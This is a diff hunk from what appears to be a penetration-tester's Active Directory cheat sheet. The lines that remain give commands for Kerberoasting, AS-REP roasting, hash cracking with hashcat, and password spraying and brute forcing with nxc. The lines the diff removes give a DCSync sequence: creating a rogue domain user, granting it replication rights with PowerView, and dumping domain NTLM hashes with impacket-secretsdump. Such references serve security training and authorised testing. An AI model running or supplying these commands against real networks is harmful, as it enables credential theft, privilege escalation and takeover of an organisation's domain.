@@ -92,18 +92,6 @@ Kerberoasting #1:echo <TGS-REP hash> > <filename1> # target-machine
 Kerberoasting #1:sudo hashcat -m 13100 <filename1> /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best66.rule --force # kali-machine
 Kerberoasting #2:nxc ldap <target> -u <user> -p <password> --asreproast asreproast.out #identify users without Kerberos pre-auth and dump AS-REP hashes to file; kali-machine
 Kerberoasting (nxc LDAP):nxc ldap <target> -u <user> -p <password> --kerberoasting output.txt #request TGS tickets for SPN accounts and save crackable Kerberos hashes to file; kali-machine
-DCSync #1:net user edwin P@ssw0rd@123 /add /domain ; # target-machine
-DCSync #1:net group "<group with writedacl>" edwin /add ; # target-machine
-DCSync #1:net localgroup "Remote Management Users" edwin /add ; # target-machine
-DCSync #1:net localgroup "Remote Desktop Users" edwin /add # target-machine
-DCSync #1:# upload powerview.ps1 to target and import-module
-DCSync #1:$password = ConvertTo-SecureString "P@ssw0rd@123" -AsPlainText -Force # target-machine
-DCSync #1:$cred = New-Object System.Management.Automation.PSCredential("<domain>\edwin", $password) # target-machine
-DCSync #1:Add-objectACL -PrincipalIdentity edwin -Credential $cred -Rights DCSync # User can dump creds from SAM with DCSync rights, kali-machine
-DCSync #1:impacket-secretsdump '<domain>/edwin'@<target> # kali-machine
-DCSync #1:impacket-secretsdump -dc-ip <dc-ip> <domain>/<user>:<password>@<dc-ip> # DCSync; kali-machine
-DCSync #1:impacket-secretsdump -k -no-pass -dc-ip <dc-ip> <domain>/@<dc-ip> # DCSync; kali-machine
-DCSync #2:impacket-secretsdump -just-dc-ntlm '<domain>/<user>':'<password>'@<target> # Domain Controller NTDS dump, dump domain NTLM hashes via DCSync; requires Domain Admin OR Enterprise Admin OR account with “Replicating Directory Changes” + “Replicating Directory Changes All” permissions; kali-machine
 nxc:nxc smb <target> -u <wordlist1> -p '<password>' --continue-on-success # password spray for userlist with domain prefix; kali-machine
 nxc:nxc smb <target> -u <wordlist1> -p '<wordlist2>' --continue-on-success # bruteforce for userlist with domain prefix; kali-machine
 nxc:nxc smb <target> -d '<domain>' -u <wordlist1> -p '<password>' --continue-on-success # password spray for userlist without domain prefix; kali-machine
